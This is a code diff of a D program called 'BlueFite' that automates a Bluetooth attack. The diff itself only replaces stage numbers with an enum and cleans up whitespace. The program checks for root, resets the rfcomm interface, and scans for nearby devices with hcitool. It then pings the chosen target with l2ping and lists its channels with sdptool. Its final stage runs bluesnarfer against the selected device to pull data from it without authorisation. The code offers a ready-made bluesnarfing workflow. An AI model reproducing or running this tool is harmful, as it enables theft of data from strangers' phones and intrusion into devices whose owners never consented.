@@ -7,60 +7,63 @@ import core.thread;
 import core.time;
 import core.stdc.stdlib;
 
-int RFCOMM = 0, TEST = 1, SCAN = 2, PING = 3, DUMP = 4, EXEC = 5, STAGE = 0;
+enum Stages {
+	RFCOMM, TEST, SCAN, PING, DUMP, EXEC
+}
+int stage;
 string TARGET_BT_MAC = "";
 int TARGET_BT_CHAN = 0;
 
 void main(string[] args){
 	writeln("\033[1;7;36m :::BlueFite::: \n\033[1;27;36mBinary wrapper by Sonic, original script by Sid \"Pahakir228\" Jaresky\033[0m");
-	
+
 	writeln(":: running priviledge check...");
 	string otp = executeShell("id -u").output.chop();
 	if(otp != "0") {
 		writeln(":: [\033[1;31mFAIL\033[0m] priviledge check");
 		writeln("This program must be run with superuser priviledges!");
 		exit (-1);
-		
+
 	}
 	Thread.sleep(dur!"seconds"(1));
 	writeln(":: [\033[1;32mOK\033[0m] priviledge check");
 	Thread.sleep(dur!"seconds"(1));
-	
+
 	writeln(":: setting up rfcomm (prep stage 0)...");
-	STAGE = RFCOMM;
-	bool ret = setup(RFCOMM);
+	stage = Stages.RFCOMM;
+	bool ret = setup(Stages.RFCOMM);
 	if(!ret) emext();
 	Thread.sleep(dur!"seconds"(1));
 	writeln(":: [\033[1;32mOK\033[0m] stage 0");
 
 	writeln(":: running test (prep stage 1)...");
-	STAGE = TEST;
-	ret = setup(TEST);
+	stage = Stages.TEST;
+	ret = setup(Stages.TEST);
 	if(!ret) emext();
 	writeln(":: [\033[1;32mOK\033[0m] stage 1");
 
 	writeln(":: running scan (work stage 2)...");
-	STAGE = SCAN;
-	ret = setup(SCAN);
+	stage = Stages.SCAN;
+	ret = setup(Stages.SCAN);
 	if(!ret) emext();
 	writeln(":: [\033[1;32mOK\033[0m] stage 2");
 
 	writeln(":: pinging target (work stage 3)...");
-	STAGE = PING;
-	ret = setup(PING);
+	stage = Stages.PING;
+	ret = setup(Stages.PING);
 	if(!ret) emext();
 	writeln(":: [\033[1;32mOK\033[0m] stage 3");
-	
+
 	writeln(":: dumping channels (work stage 4)...");
-	STAGE = DUMP;
-	ret = setup(DUMP);
+	stage = Stages.DUMP;
+	ret = setup(Stages.DUMP);
 	if(!ret) emext();
 	writeln(":: [\033[1;32mOK\033[0m] stage 4");
-	
+
 	writeln(":: executing...");
-	STAGE = EXEC;
-	ret = setup(EXEC);
-	if(ret) 
+	stage = Stages.EXEC;
+	ret = setup(Stages.EXEC);
+	if(ret)
 		writeln("\033[1;32mFIN\033[0m");
 	else
 		writeln("\033[1;31mFIN\033[0m");
@@ -68,9 +71,9 @@ void main(string[] args){
 }
 
 void emext(){
-	writeln(":: [\033[1;31mFAIL\033[0m] stage " ~ to!string(STAGE));
+	writeln(":: [\033[1;31mFAIL\033[0m] stage " ~ to!string(stage));
 	writeln("Error occured while running stage!");
-	exit(STAGE);
+	exit(stage);
 }
 
 void rext(){
@@ -81,7 +84,7 @@ void rext(){
 bool setup(int stage){
 	bool res = false;
 	switch(stage) {
-		case 0:
+		case Stages.RFCOMM:
 			int stat = 0;
 			stat += executeShell("hciconfig -a hci0 down").status;
 			stat += executeShell("rm -rf /dev/bluetooth/rfcomm").status;
@@ -93,7 +96,7 @@ bool setup(int stage){
 			if(stat != 0) res = false;
 			else res = true;
 		break;
-		case 1:
+		case Stages.TEST:
 			auto p = executeShell("hciconfig hci0");
 			string outp = p.output;
 			int code = p.status;
@@ -103,11 +106,11 @@ bool setup(int stage){
 				res = true;
 			}
 		break;
-		case 2:
+		case Stages.SCAN:
 			auto p = executeShell("hcitool scan");
 			string output = p.output;
 			string[] targets;
-			
+
 			if(output.length < 18){
 				res = false;
 				writeln("Couldn't find any targets :(");
@@ -144,25 +147,25 @@ bool setup(int stage){
 			writeln(":: proceeding for mac '" ~ TARGET_BT_MAC ~ "'");
 			res = true;
 		break;
-		case 3:
+		case Stages.PING:
 			auto pipe = pipe();
 			auto p = executeShell("l2ping -c 2 " ~ TARGET_BT_MAC);
 			int result = p.status;
-			
+
 			foreach(string s; p.output.chop().split("\n")){
 				if(s == "Can't connect: Host is down"){
 					writeln(":: can't connect: host is down");
 					emext();
 				}
 			}
-			
+
 			if(result != 0) {
 				res = false;
 				break;
 			}
 			res = true;
 		break;
-		case 4:
+		case Stages.DUMP:
 			auto p = executeShell("sdptool browse " ~ TARGET_BT_MAC);
 			string output = p.output;
 			string lines_construct = ":: select channel:\n";
@@ -194,7 +197,7 @@ bool setup(int stage){
 			}
 			res = true;
 		break;
-		case 5:
+		case Stages.EXEC:
 			auto p = executeShell("bluesnarfer -b -C " ~ to!string(TARGET_BT_CHAN) ~ " " ~ TARGET_BT_MAC ~ " -i");
 			writeln("\n:: bluesnarfer says:\n" ~ p.output);
 			res = (p.status == 0);
